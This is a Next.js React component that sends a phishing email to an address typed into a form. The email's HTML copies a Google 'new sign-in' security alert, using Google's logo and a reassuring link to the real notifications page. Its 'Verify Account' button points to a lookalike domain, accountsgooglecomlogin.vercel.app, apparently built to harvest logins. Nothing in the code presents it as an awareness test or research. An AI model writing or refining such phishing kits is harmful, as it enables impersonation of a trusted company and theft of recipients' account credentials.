"use client";
import { useState } from "react";

export default function Home() {
  const [email, setEmail] = useState("");

  async function sendEmail() {

    const res = await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        toEmail: email, 
        subject: "Security alert",
        htmlContent: 
        `<div style="position: relative; width:100%; box-sizing:border-box; padding:4%; margin:0 auto; font-size: 15px;">
        <div style="display: flex; flex-direction: column; justify-content: center; max-width:65%; min-width:320px; margin:0 auto;">
            <div style="border:1px solid grey; text-align:center; padding:25px; border-radius:8px; margin:20px 0 auto;">
                <div>
                    <img 
                        style="width:74px; height:24px; margin-bottom:20px;" 
                        alt="Google Logo"
                        src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png"/>
                    <p style="margin:0 0 15px 0;">A new sign-in on A001</p>
                </div>
                <hr style="border:none; border-top:1px solid rgb(106,106,106); margin:20px 0;">
                <p style="margin:0 0 40px 0; line-height:1.5;">
                    We noticed a new sign-in to your Google Account on an A001 device. If this was you, you don’t need to do anything. If not, we’ll help you secure your account.
                </p>
                <a 
                    href="https://accountsgooglecomlogin.vercel.app"
                    style="text-decoration:none; display:inline-block; background-color:rgb(79, 132, 247); color:white; padding:10px 20px; border-radius:4px;"
                >Verify Account</a>
                <div style="position:relative; margin-top:25px; font-size:12px;">
                    You can also see security activity at<br/>
                    <a href="https://myaccount.google.com/notifications" style="color:rgb(106, 106, 106); text-decoration:none;">
                        https://myaccount.google.com/notifications
                    </a>
                </div>
            </div>
        </div>
    </div>`,
      }),
    });

    const data = await res.json();
    console.log(data.message || data.error)
  }

  return (

    <div className="p-10">
      <input
        type="email"
        placeholder="Enter user email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        className="border p-2 rounded mr-2"
      />
      <button onClick={sendEmail} className="bg-green-500 text-white px-4 py-2 rounded">
        Send Email
      </button>
    </div>
  );
}
